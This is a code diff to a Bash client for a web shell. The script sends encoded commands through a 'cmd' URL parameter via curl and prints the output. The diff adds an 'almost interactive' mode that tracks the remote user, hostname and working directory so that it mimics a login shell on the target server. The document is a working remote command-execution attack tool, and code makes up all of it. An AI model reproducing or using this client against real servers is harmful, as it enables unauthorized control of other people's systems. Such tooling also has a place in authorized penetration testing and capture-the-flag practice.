@@ -22,7 +22,7 @@ build_payload()
 send_payload()
 {
   raw=$(curl -s "$url" -G --data-urlencode "cmd=$payload")
-  echo "$raw\\n" # Return the command output
+  echo "$raw" # Return the command output
 }
 
 execute_command()
@@ -31,7 +31,7 @@ execute_command()
   encoded_cmd=$(encode_command "$cmd")
   payload=$(build_payload "$encoded_cmd")
   response=$(send_payload "$payload")
-  printf "$response"
+  echo "$response"
 }
 
 better_shell()
@@ -41,7 +41,28 @@ better_shell()
     if [ "$command" == "exit" ]; then 
       break
     fi
-    execute_command "$command"
+    result=$(execute_command "$command")
+    printf "$result\\n"
+  done
+}
+
+almost_interactive_shell()
+{
+  user=$(execute_command "whoami")
+  hostname=$(execute_command "hostname")
+  path=$(execute_command "pwd")
+  while :; do
+    printf "$user@$hostname:$path$ "
+    read -e command
+    if [ "$command" == "exit" ]; then 
+      break
+    fi
+    result=$(execute_command "cd $path; $command; pwd")
+    command_output=$(echo -ne "$result" | head -n -1)
+    if [[ -n "$command_output" ]]; then 
+      printf "$command_output\\n"; 
+    fi
+    path=$(echo -ne "$result" | tail -n 1)
   done
 }
 
@@ -50,8 +71,11 @@ if [[ $# -eq 0 ]]; then
   exit 0
 fi
 
+interactive=0
 while [ "$1" != "" ]; do
  case $1 in 
+   -i | --interactive ) interactive=1
+                        ;;
    -u | --url )   shift
                   url=$1
                   ;;
@@ -64,4 +88,11 @@ while [ "$1" != "" ]; do
  shift
 done
 
-better_shell
+if [[ $interactive == 1 ]]; then
+  almost_interactive_shell
+else 
+  better_shell
+fi
+
+echo "Bye"
+
